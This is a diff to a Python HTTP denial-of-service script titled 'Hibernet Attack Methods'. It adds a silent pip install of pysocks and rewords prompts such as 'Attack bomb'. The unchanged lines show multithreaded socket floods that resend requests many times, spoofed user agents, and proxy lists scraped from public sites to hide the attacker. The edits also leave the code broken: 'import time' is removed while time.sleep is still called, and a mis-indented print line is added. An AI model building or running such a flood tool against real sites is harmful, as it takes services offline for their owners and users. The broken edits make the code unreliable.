@@ -1,3 +1,16 @@
+#import module
+import os, sys
+
+try:
+    import socks
+except:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install pysocks")
+    elif sys.platform.startswith("freebsd"):
+        os.system("pip3 install pysocks")
+    else:
+        os.system("pip install pysocks")
+#@title Hibernet Attack Methods
 import socket
 import socks
 import threading
@@ -6,13 +19,17 @@ import re
 import urllib.request
 import os
 import sys
-import time
-
 
 os.system("clear")
 print("З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
+
+print('''
+
+DDOS HTTP
+	''') # la grafica ci sta
+
 
 
 useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
@@ -495,7 +512,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 def proxymode():
 	global choice2
-	choice2 = input("Proxy/socks mode? Answer 'y' ")
+	choice2 = input("Proxy/socks mode? Answer 'y' to enable it: ")
 	if choice2 == "y":
 		choiceproxysocks()
 	else:
@@ -513,7 +530,7 @@ def choiceproxysocks():
 		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Download a new list of proxy? Answer 'y' ")
+	choice4 = input("Download a new list of proxy? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
@@ -521,7 +538,7 @@ def choicedownproxy():
 		proxylist()
 
 def choicedownsocks():
-	choice4 = input("Download a new list of socks? Answer 'y' ")
+	choice4 = input("Download a new list of socks? Answer 'y' to do it: ")
 	if choice4 == "y":
 		urlproxy = "https://www.socks-proxy.net/"
 		proxyget(urlproxy)
@@ -573,14 +590,14 @@ def numthreads():
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+		multiple = int(input("Attack bomb [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
 	except ValueError:
 		print("You mistyped, try again.\n")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("Press 'Enter' start Attack: ")
+	choice6 = input("'Enter' Attack: ")
 	if choice6 == "":
 		loop()
 	elif choice6 == "Enter": #lool
@@ -632,6 +649,7 @@ def loop():
 		for x in range(threads):
 			RequestDefaultHTTP(x+1).start() # starta la classe apposita
 			print ("Thread " + str(x) + " ready!")
+			
 		go.set() # questo fa avviare i threads appena sono tutti pronti
 
 
@@ -743,7 +761,7 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
 				s.connect((str(url2), int(urlport))) # connessione
 				s.send (str.encode(request)) # invio
-				print ("Request sent! @", self.counter) # print req + counter
+				 print ("Request sent! @", self.counter) # print req + counter
 				try: # invia altre richieste nello stesso thread
 					for y in range(multiple): # fattore di moltiplicazione
 						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
